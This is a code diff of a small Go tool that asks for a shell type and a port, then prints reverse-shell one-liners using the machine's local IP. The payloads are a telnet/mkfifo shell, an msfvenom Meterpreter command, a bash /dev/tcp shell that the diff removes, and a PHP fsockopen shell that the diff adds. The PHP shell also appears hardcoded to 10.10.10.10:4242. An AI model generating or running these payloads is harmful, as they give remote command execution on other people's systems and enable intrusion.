@@ -12,7 +12,7 @@ import (
 
 /*func lstOfRevShells() {
 const bashS = done
-const phpS =
+const phpS = done
 const javaS =
 const perlS =
 const pythonS =
@@ -35,19 +35,19 @@ func supply() net.IP {
 	}
 	defer conn.Close()
 	localAddr := conn.LocalAddr().(*net.UDPAddr)
-	fmt.Println(localAddr.IP)
+	//fmt.Println(localAddr.IP)
 	//get local ip part is over and the lexical part begins
 	const intMessage = "Hello user, let us create so reverse shells! What we going to choose today?"
 	const listOfShells = "1. Bash Reverse Shell.\n2. Windows Meterpreter Staged Reverse TCP (x64).\n" +
 		"3. Telnet Reverse Shell.\n" +
-		"Perl Reverse Shell.\nPython Reverse Shell.\nRuby Reverse Shell.\nNetcat Reverse Shell."
+		"4. PHP Reverse Shell.\nPython Reverse Shell.\nRuby Reverse Shell.\nNetcat Reverse Shell."
 	fmt.Println(intMessage, "\n"+listOfShells)
 	fmt.Println("So what shell we going to take?\nJust choose the right number:")
 	// var then variable name then variable type
 	var choosenS string
 	// Taking input from user
 	fmt.Scanln(&choosenS)
-	fmt.Println("What Port we going to use?\nJust type the number(Port, shell) or name(shell):")
+	fmt.Println("What Port we going to use?\nJust type the right port:")
 	var choosenP string
 	const denesinhno = "penesinhno"
 	_ = denesinhno
@@ -66,6 +66,9 @@ func supply() net.IP {
 			" LPORT=", choosenP, " -f exe -o reverse.exe\n")
 	case "3", "Telnet", "telnet":
 		fmt.Print("TF=$(mktemp -u);mkfifo $TF && telnet ", ipa, " ", choosenP, " 0<$TF | sh 1>$TF")
+	case "4", "PHP", "Php", "php":
+		const phpO, phpT = "php -r '$sock=fsockopen(\"", ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+		fmt.Print(phpO, ipa, ",", choosenP, phpT)
 
 	}
 	return localAddr.IP
@@ -79,14 +82,18 @@ func runForever() {
 }
 
 func a() {
-	/*switch choosenS {
-	case "1", "Bash Reverse Shell", "Bash", "Reverse", "reverse":
-		fmt.Print("sh -i >& /dev/tcp/", ipa, "/9001 0>&1\n")
-	}*/
+	var phpO = "php -r '$sock=fsockopen(\"10.10.10.10\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+	fmt.Println(phpO)
+	/*var result =
+	fmt.Printf("%q", result)*/
 }
 
+//@formatter:off
 func main() {
-	supply()
-	runForever()
+	//never get high on your own:
+	 supply()
+
+	 runForever()
 }
+//@formatter:on
 
